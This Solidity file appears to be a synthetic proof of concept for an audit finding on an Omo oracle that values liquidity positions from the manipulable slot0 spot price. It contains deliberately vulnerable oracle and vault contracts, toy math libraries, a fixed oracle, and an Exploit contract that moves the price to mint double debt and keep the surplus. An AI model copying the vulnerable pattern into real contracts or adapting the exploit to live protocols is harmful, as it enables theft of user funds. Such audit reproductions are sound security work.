// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Omo — getLiquidityAmounts uses the spot price (Pashov Audit Group, H-08)
    SYNTHETIC, cheatcode-free. slot0() is read inside the same transaction
    the attacker moves it. The position is then worth 2000 instead of 1000,
    and the vault mints the extra 1000 of debt. The fixed oracle passes a
    constant sqrt price into the same amount helper. */

interface IUniswapV3Pool {
    function slot0()
        external
        view
        returns (uint160 sqrtPriceX96, int24, uint16, uint16, uint16, uint8, bool);
}

interface INonfungiblePositionManager {
    function factory() external view returns (address);
}

library TickMath {
    function getSqrtRatioAtTick(int24 tick) internal pure returns (uint160) {
        if (tick < 0) return uint160(1 << 96);
        return uint160(uint256(1 << 96) * 2);
    }
}

library LiquidityAmounts {
    function getAmountsForLiquidity(uint160 sqrtPriceX96, uint160, uint160, uint128 liquidity)
        internal
        pure
        returns (uint256 amount0, uint256 amount1)
    {
        uint256 fair = uint256(1 << 96);
        if (uint256(sqrtPriceX96) <= fair) {
            amount0 = uint256(liquidity) / 2;
            amount1 = uint256(liquidity) / 2;
        } else {
            amount0 = 0;
            amount1 = uint256(liquidity) * uint256(sqrtPriceX96) / fair;
        }
    }
}

contract Debt {
    string public constant symbol = "DEBT";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Pool is IUniswapV3Pool {
    uint160 public sqrtPriceX96;

    constructor() {
        sqrtPriceX96 = uint160(1 << 96);
    }

    function slot0() external view returns (uint160, int24, uint16, uint16, uint16, uint8, bool) {
        return (sqrtPriceX96, 0, 0, 0, 0, 0, false);
    }

    function moveSpot(uint160 next) external {
        sqrtPriceX96 = next;
    }
}

contract PositionManager is INonfungiblePositionManager {
    address public pool;

    constructor(address p) {
        pool = p;
    }

    function factory() external view returns (address) {
        return pool;
    }
}

contract OmoOracle {
    function getLiquidityAmounts(address positionManager, uint256, uint128 liquidity)
        public
        view
        returns (uint256 amount0, uint256 amount1)
    {
        INonfungiblePositionManager nftManager = INonfungiblePositionManager(positionManager);
        IUniswapV3Pool pool = IUniswapV3Pool(nftManager.factory());
        // @> VULN: slot0 is the spot price, so a same-transaction swap changes the amounts
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        (amount0, amount1) = LiquidityAmounts.getAmountsForLiquidity(
            sqrtPriceX96,
            TickMath.getSqrtRatioAtTick(-1),
            TickMath.getSqrtRatioAtTick(1),
            liquidity
        );
    }

    function getPositionValue(address positionManager, uint256 tokenId, uint128 liquidity)
        external
        view
        returns (uint256)
    {
        (uint256 amount0, uint256 amount1) = getLiquidityAmounts(positionManager, tokenId, liquidity);
        return amount0 + amount1;
    }
}

contract OmoOracleFixed {
    function getPositionValue(address, uint256, uint128 liquidity) external pure returns (uint256) {
        uint160 sqrtPriceX96 = uint160(1 << 96);
        (uint256 amount0, uint256 amount1) = LiquidityAmounts.getAmountsForLiquidity(
            sqrtPriceX96,
            TickMath.getSqrtRatioAtTick(-1),
            TickMath.getSqrtRatioAtTick(1),
            liquidity
        );
        return amount0 + amount1;
    }
}

contract Vault {
    Debt public debt;
    OmoOracle public oracle;
    address public positionManager;
    uint128 public constant LIQUIDITY = 1000;

    constructor(address debt_, address oracle_, address pm) {
        debt = Debt(debt_);
        oracle = OmoOracle(oracle_);
        positionManager = pm;
    }

    function borrow() external returns (uint256 minted) {
        minted = oracle.getPositionValue(positionManager, 1, LIQUIDITY);
        debt.mint(msg.sender, minted);
    }
}

contract Exploit {
    uint256 public constant FAIR = 1000;
    uint256 public constant EXTRA = 1000;

    Debt public debt; // CREATE nonce 1
    Pool public pool; // CREATE nonce 2
    PositionManager public pm; // CREATE nonce 3
    OmoOracle public oracle; // CREATE nonce 4
    Vault public vault; // CREATE nonce 5

    uint256 public minted;
    uint256 public extra;

    constructor() {
        debt = new Debt();
        pool = new Pool();
        pm = new PositionManager(address(pool));
        oracle = new OmoOracle();
        vault = new Vault(address(debt), address(oracle), address(pm));
    }

    function run() external {
        pool.moveSpot(uint160(uint256(1 << 96) * 2));
        minted = vault.borrow();
        extra = minted - FAIR;
        require(minted == FAIR + EXTRA, "inflated mint");
        require(extra == EXTRA, "extra borrow");
        debt.transfer(msg.sender, extra);
    }
}
